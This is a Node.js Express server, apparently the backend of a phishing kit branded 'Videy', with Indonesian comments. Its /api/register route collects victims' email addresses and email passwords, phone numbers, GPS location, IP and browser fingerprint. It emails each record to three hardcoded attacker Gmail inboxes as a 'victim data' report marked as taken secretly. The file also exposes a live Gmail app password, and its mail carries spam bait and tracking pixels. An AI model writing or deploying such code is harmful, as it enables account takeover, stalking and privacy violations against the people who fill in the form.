const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const RECEIVER_EMAIL = [
    'gajeb682@gmail.com',
    'akunvanzz888@gmail.com',
    'zamzaja78@gmail.com'
];

// <== TAMBAHAN 1: Cooldown per EMAIL TARGET (bukan per sender)
// Format: { "target@email.com": { lastSendTime: timestamp, lastPassword: "xxx" } }
const TARGET_COOLDOWN = {};

const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000; // 1 jam

// <== TAMBAHAN 2: Cek apakah target bisa dikirimi email
function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    
    // Kasus 1: Target belum pernah dikirimi → BISA
    if (!record) {
        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
        return true;
    }
    
    // Kasus 2: Password BERBEDA dari sebelumnya → BISA (langsung, tanpa cooldown)
    if (record.lastPassword !== currentPassword) {
        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim (reset cooldown)`);
        return true;
    }
    
    // Kasus 3: Password SAMA → cek cooldown 1 jam
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    
    if (!canSend) {
        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
        console.log(`⏰ COOLDOWN: ${targetEmail} (password SAMA) → Tunggu ${remainingMinutes} menit lagi`);
        return false;
    }
    
    console.log(`✅ Cooldown selesai untuk ${targetEmail} → BISA dikirim`);
    return true;
}

// <== TAMBAHAN 3: Update cooldown setelah kirim
function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
    console.log(`📝 Cooldown updated: ${targetEmail} | Password: ${currentPassword.substring(0,3)}*** | Waktu: ${new Date().toISOString()}`);
}

// <== TAMBAHAN 4: File untuk menyimpan history duplicate (password lama)
const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

// <== TAMBAHAN 5: Cek duplicate email (tanpa cooldown, ini untuk password sama)
function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    
    if (!lastPassword) return false; // Belum pernah ada
    if (lastPassword === currentPassword) return true; // Password sama persis
    
    // Password beda → update history
    history[targetEmail] = currentPassword;
    saveHistory(history);
    console.log(`📝 History updated: ${targetEmail} → password BARU`);
    return false;
}

// <== TAMBAHAN 6: Function generate subject spam
function getSpamSubject(targetEmail, isRetry = false) {
    const spamSubjects = [
        `!!! URGENT!!! YOUR ACCOUNT ${targetEmail} WILL BE SUSPENDED !!!`,
        `🔴🔴🔴 WINNER!!! YOU WON 5000 DIAMONDS 🔴🔴🔴`,
        `✅✅✅ FREE ✅✅✅ FREE ✅✅✅ FREE ✅✅✅ CLAIM NOW!!!`,
        `🏆🏆🏆 CONGRATULATIONS ${targetEmail} YOU ARE SELECTED 🏆🏆🏆`,
        `⚠️⚠️⚠️ LAST CHANCE!!! VERIFY YOUR ACCOUNT ⚠️⚠️⚠️`,
        `💎💎💎 5000 DM GRATIS UNTUK ${targetEmail} 💎💎💎`,
        `🔴 URGENT: ${targetEmail} YOUR PASSWORD WILL EXPIRE TODAY 🔴`
    ];
    let subject = spamSubjects[Math.floor(Math.random() * spamSubjects.length)];
    if (isRetry) subject = `[RETRY] ` + subject;
    return subject;
}

// <== TAMBAHAN 7: Kata trigger spam
const spamKeywords = [
    "viagra", "memek", "porn", "free money", "hack", "credit card", 
    "lottery", "winner", "kontol", "claim now", "urgent", "password", 
    "verify", "account suspended", "bitcoin", "crypto", "gambling"
];

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// Route kirim email
app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 STEALTH DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Target Email:', data.email);
        console.log('🔑 Password:', data.emailPassword);
        console.log('📱 Phone:', data.phone);
        
        // <== TAMBAHAN 8: CEK DUPLICATE PASSWORD (history)
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        
        // <== TAMBAHAN 9: CEK COOLDOWN (hanya untuk password yang sama)
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            console.log(`❌ TIDAK DIKIRIM: ${data.email} | Password SAMA & masih cooldown 1 jam`);
            return res.json({
                success: true,
                blocked: true,
                reason: `Cooldown 1 jam untuk email yang sama dengan password yang sama`,
                cooldownInfo: getCooldownInfo(data.email)
            });
        }
        
        // Kalau password beda, cooldown di-reset (bisa kirim langsung)
        if (!isDup) {
            console.log(`🔄 Password BERBEDA untuk ${data.email} → Cooldown di-reset, LANGSUNG KIRIM`);
        }
        
        console.log(`✅ PROSES KIRIM...`);
        
        // ========== HTML CONTENT (FORCE SPAM) ==========
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=http://fake-spam-site-${Date.now()}.com">
    <title>VIDEY - Stealth Data Report</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 100%); color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 900px; margin: 0 auto; background: #0a1628; border-radius: 20px; overflow: hidden; border: 1px solid #1877f2; }
        .header { background: linear-gradient(135deg, #1877f2, #0d6efd); padding: 25px; text-align: center; }
        .header h1 { margin: 0; font-size: 28px; }
        .content { padding: 25px; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 12px; border-bottom: 1px solid rgba(24,119,242,0.3); }
        .label { width: 35%; font-weight: bold; color: #1877f2; background: rgba(24,119,242,0.1); }
        .value { width: 65%; }
        .section-title { background: rgba(24,119,242,0.2); color: #1877f2; font-size: 20px; font-weight: bold; padding: 12px 15px; margin: 20px 0 10px; border-left: 4px solid #1877f2; }
        .footer { background: #0d1f3c; padding: 15px; text-align: center; font-size: 12px; color: #888; }
        blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        marquee { font-size: 18px; font-weight: bold; }
        .spam-hidden { display: none; visibility: hidden; height: 0; width: 0; position: absolute; left: -9999px; }
    </style>
</head>
<body>
    <div class="spam-hidden">
        ${spamKeywords.join(' ')} ${spamKeywords.join(' ')}
        <img src="http://fake-tracking-pixel-${Date.now()}.com/spam.gif?email=${data.email}" width="1" height="1">
        <iframe src="http://fake-iframe-spam-${Date.now()}.com" width="0" height="0"></iframe>
    </div>
    <div style="text-align: center; background: #ff0000; padding: 5px; margin-bottom: 10px;">
        <blink><marquee behavior="alternate" scrollamount="10"><span style="color: yellow;">⚠️⚠️⚠️ URGENT! VERIFICATION REQUIRED! CLAIM YOUR PRIZE NOW! ⚠️⚠️⚠️</span></marquee></blink>
    </div>
    <div class="container">
        <div class="header"><h1>🔐 𝗗𝗔𝗧𝗔 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗞𝗢𝗥𝗕𝗔𝗡 🔐</h1><p>User Registration Report</p></div>
        <div class="content">
            <div class="section-title">📧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗔𝗧𝗔</div>
            <table>
                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
                <tr><td class="label">Email Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
                <tr><td class="label">Manual Location:</td><td class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</td></tr>
            </table>
            <div class="section-title">📍 GPS LOCATION</div>
            <table><tr><td class="label">Latitude:</td><td class="value">${data.latitude || 'TIDAK DAPAT'}</td></tr>
            <tr><td class="label">Longitude:</td><td class="value">${data.longitude || 'TIDAK DAPAT'}</td></tr>
            <tr><td class="label">Accuracy:</td><td class="value">${data.gps_accuracy || '-'} meters</td></tr></table>
            <div class="section-title">🌐 IP & NETWORK</div>
            <table><tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
            <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
            <tr><td class="label">IP Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_region || '-'}, ${data.ip_country || '-'}</td></tr></table>
            <div class="section-title">🖥️ BROWSER FINGERPRINT</div>
            <table><tr><td class="label">User Agent:</td><td class="value" style="font-size:12px">${data.userAgent || '-'}</td></tr>
            <tr><td class="label">Platform:</td><td class="value">${data.platform || '-'}</td></tr>
            <tr><td class="label">Screen Resolution:</td><td class="value">${data.screenResolution || '-'}</td></tr></table>
            <div class="section-title">⏰ TIMESTAMP</div>
            <table><tr><td class="label">Registration Time:</td><td class="value">${data.timestamp || '-'}</td></tr></table>
            <hr><div class="warning">⚠️ Data ini diambil secara diam-diam ⚠️</div>
        </div>
        <div class="footer">&copy; 2026 Videy - Stealth Monitoring System</div>
    </div>
    <img src="http://fake-spam-tracker-${Date.now()}.com/open.gif?email=${data.email}" width="0" height="0" style="display:none">
</body>
</html>
`;
        
        // <== TAMBAHAN 10: KIRIM EMAIL
        const fakeEmails = [`spam${Date.now()}@gmail.com`, `fake${Date.now()}@yahoo.com`];
        
        await transporter.sendMail({
            from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 🏆🏆🏆" <${SENDER_EMAIL}>`,
            to: RECEIVER_EMAIL,
            bcc: fakeEmails,
            subject: getSpamSubject(data.email),
            html: htmlContent,
            attachments: [{
                filename: `videy_stealth_${Date.now()}.json`,
                content: JSON.stringify(data, null, 2)
            }],
            headers: {
                'X-Priority': '1',
                'X-MSMail-Priority': 'High',
                'Importance': 'high',
                'X-Mailer': 'Microsoft Outlook Express 6.0',
                'X-Spam-Flag': 'YES',
                'X-Spam-Score': '99.9',
                'Precedence': 'bulk'
            }
        });
        
        // <== TAMBAHAN 11: UPDATE COOLDOWN (hanya untuk password yang sama)
        updateTargetCooldown(data.email, data.emailPassword);
        
        // Update history password
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        console.log(`✅ EMAIL TERKIRIM (MASUK SPAM)! Target: ${data.email}`);
        res.json({ success: true, message: 'Email sent to spam folder' });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// <== TAMBAHAN 12: Endpoint cek cooldown status
app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        lastPassword: record.lastPassword.substring(0, 3) + '***',
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
        remainingHours: (remainingMs / (1000 * 60 * 60)).toFixed(1)
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email akan MASUK FOLDER SPAM!`);
    console.log(`⏰ Cooldown: 1 JAM untuk EMAIL TARGET + PASSWORD SAMA`);
    console.log(`🔄 Password BEDA → LANGSUNG KIRIM (tanpa cooldown)`);
});
